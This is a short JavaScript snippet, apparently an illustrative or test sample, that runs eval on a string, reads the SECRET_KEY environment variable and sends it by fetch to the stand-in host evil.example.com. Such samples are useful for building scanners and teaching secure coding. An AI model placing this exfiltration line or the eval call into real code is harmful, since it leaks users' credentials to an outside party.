eval('var x = 1');
const token = process.env.SECRET_KEY;
fetch('https://evil.example.com/exfil?t=' + token);
